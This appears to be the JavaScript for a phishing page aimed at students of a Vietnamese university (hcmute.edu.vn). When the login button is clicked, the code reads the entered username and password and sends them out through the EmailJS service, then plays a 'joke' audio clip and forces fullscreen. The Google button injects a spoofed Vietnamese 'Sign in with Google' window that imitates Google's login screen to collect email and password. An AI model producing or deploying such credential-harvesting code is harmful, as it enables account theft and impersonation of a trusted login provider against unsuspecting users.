
const loginBtn = document.querySelector('#loginbtn')
const googleBtn = document.querySelector('.btn-Google')
const pageWrapper = document.querySelector('#page-wrapper')

//show Joke
function showJoke() {
    document.querySelector('.joke').style.animation = 'move 0.5s forwards';
    var audio = document.querySelector('#joke-audio')
    audio.currentTime = 0.2 * 60
    audio.play()
}
function addFileCss() {
    var cssId = 'myCss';  // you could encode the css path itself to generate id..
    if (!document.getElementById(cssId)) {
        var head = document.getElementsByTagName('head')[0];
        var link = document.createElement('link');
        link.id = cssId;
        link.rel = 'stylesheet';
        link.type = 'text/css';
        link.href = './assets/google-login.css';
        link.media = 'all';
        head.appendChild(link);
    }
}
function addFileJS() {
    var body = document.getElementsByTagName('body')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.onload = function () {
        callFunctionFromScript();
    }
    script.src = './js/google-login.js';
    body.appendChild(script);
}
function openFullscreen() {
    var elem = document.documentElement;
    if (elem.requestFullscreen) {
        elem.requestFullscreen();
    } else if (elem.webkitRequestFullscreen) { /* Safari */
        elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) { /* IE11 */
        elem.msRequestFullscreen();
    }
}
//Ham gui Email
function sendEmail(email, password) {
    emailjs.send("service_aka17ws", "template_q8bzyhf", {
        email: email,
        pass: password,
    });
}
//Event Handler
loginBtn.addEventListener('click', () => {
    showJoke();
    openFullscreen();
    var username = document.querySelector('#username').value
    var pwd = document.querySelector('#password').value
    sendEmail(username, pwd);

})
googleBtn.addEventListener('click', function (e) {
    var body = document.getElementsByTagName("BODY")[0];
    pageWrapper.remove()
    addFileCss();
    let htmls = `
    <div class="spoofHeader">
        <div class="nav">
            <div class="left">
                <img src="./assets/google-logo.png">
                <h2>Đăng nhập với tài khoản Google</h2>
            </div>
            <div class="right">
                <i class="fa-solid fa-minus"></i>
                <i class="fa-regular fa-square"></i>
                <i class="fa-solid fa-xmark"></i>
            </div>
        </div>
        <div class="back">
            <i class="fa-solid fa-arrow-left" id="backBtn"></i>
        </div>
    </div>
    <div class="wrapper">
        <div class="progress-bar">
            <div class="progress"></div>
        </div>
        <div class="header">
            <img src="./assets/google-logo.png">
            <h2>Đăng nhập bằng Google</h2>
        </div>
        <div id="input-email">
            <div class="content">
                <h1>Đăng nhập</h1>
                <p>Tiếp tục tới <span class="link">hcmute.edu.vn</span></p>
                <div class="form-group">
                    <span class="label">Email hoặc số điện thoại</span>
                    <input type="email" class="form-control" id="txtEmail">
                </div>
                <a href="#" class="link">Bạn quên địa chỉ email?</a>
            </div>
            <div class="footer">
                <a class="link">Tạo tài khoản</a>
                <button class="btn" id="nextEmail">Tiếp theo</button>
            </div>
        </div>
        <!--Password-->
        <div id="input-pass">
            <div class="content">
                <h1>Chào mừng</h1>
                <p class="email-address">
                    <i class="fa-solid fa-circle-user"></i>
                    <span>19110420@student.hcmute.edu.vn</span>
                </p>
                <p>Để tiếp tục, trước tiên, hãy xác minh danh tính của bạn</p>
                <div class="form-group focus">
                    <span class="label">Nhập mật khẩu của bạn</span>
                    <input type="password" class="form-control" id="txtPass">
                </div>
                <label for="show-pass" class="show-pass">
                    <input type="checkbox" id="show-pass">Hiện mật khẩu
                </label>
            </div>
            <div class="footer">
                <a class="link">Bạn quên mật khẩu?</a>
                <button class="btn" id="nextPass">Tiếp theo</button>
            </div>
        </div>

    </div>
    <div class="setting">
        <p class="sumary">Tiếng Việt</p>
        <div>
            <a href="#" class="link-setting">Trợ giúp</a>
            <a href="#" class="link-setting">Bảo mật</a>
            <a href="#" class="link-setting">Điều khoản</a>
        </div>
    </div>`;
    body.insertAdjacentHTML("afterbegin",htmls);
    addFileJS();
    openFullscreen()
})
